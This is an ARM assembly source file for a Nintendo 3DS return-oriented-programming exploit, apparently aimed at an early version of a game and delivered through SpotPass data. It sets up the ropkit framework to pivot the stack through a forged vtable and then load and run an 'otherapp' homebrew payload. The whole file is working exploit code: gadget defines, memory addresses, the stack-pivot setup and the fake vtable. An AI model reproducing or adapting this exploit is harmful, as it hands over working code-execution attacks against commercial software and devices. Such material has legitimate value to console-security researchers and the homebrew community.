	.arm
	.text
	
#include "includes.h"    				//created by running the generate_ropinclude(.sh/.py) script on your target app's code.bin

/* note that these below defines will likely be different app to app */
#define GARBAGE 0x44444444
#define NOP 0xe1a00000
#define STACK_PIVOT ROP_POPR3_ADDSPR3_POPPC

#define ROPBUF 0x1579e080  				//virtual memory location of rop payload (ropkit.bin) that launches otherapp. make sure the address in the makefile matches this define. since it "piggybacks" on spotpass data, this is hardcoded in linearmem by the 3ds. no PASLR because old SDK, yay.
//#define ROPKIT_BINPAYLOAD_ADDR 0x1579d860 + 0x1000    
#define ROPKIT_LINEARMEM_REGIONBASE 0x14000000   	//would be 0x30000000 for newer titles (roughly firmware 8.0 and above)
#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x400000) //Choosing this is pure guesswork. Seems ok-ish

//#define ROPKIT_MOUNTSD					//not all titles can access the sdmc! some will need to read otherapp from the savefile
//#define ROPKIT_MOUNTSAVEDATA
//#define ROPKIT_BINPAYLOAD_PATH "sd:/otherapp.bin"       //would be "data:/otherapp.bin" for a savedata mount
#define ROPKIT_TMPDATA ROPKIT_LINEARMEM_BUF-0x10000     //this is the default address. I use this because v1.1/1.0 mk7 stack is only 0x4000! They increase it to 0x40000 in 1.2.
#define ROPKIT_BINLOAD_TEXTOFFSET 0x4e0000		//this is virtual address 0x4e0000, the default entrypoint of *hax otherapp payloads. trying to avoid gadgets and roaming threads by hiding it near the end!
//#define ROPKIT_BINPAYLOAD_FILEOFFSET
#define ROPKIT_ENABLETERMINATE_GSPTHREAD                //commented out in ropkit_boototherapp. hey if it works...
#define ROPKIT_BEFOREJUMP_CACHEBUFADDR (ROPKIT_LINEARMEM_REGIONBASE+0x200000)
#define ROPKIT_BEFOREJUMP_CACHEBUFSIZE 0x800000  	//large gsgpu flush fixes our new3ds L2 cache issues - and increases stability for old3ds


#include "ropkit_ropinclude.s"
.global _start
_start:
ropstackstart:

#include "ropkit_boototherapp.s"  

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACK_PIVOT @ Vtable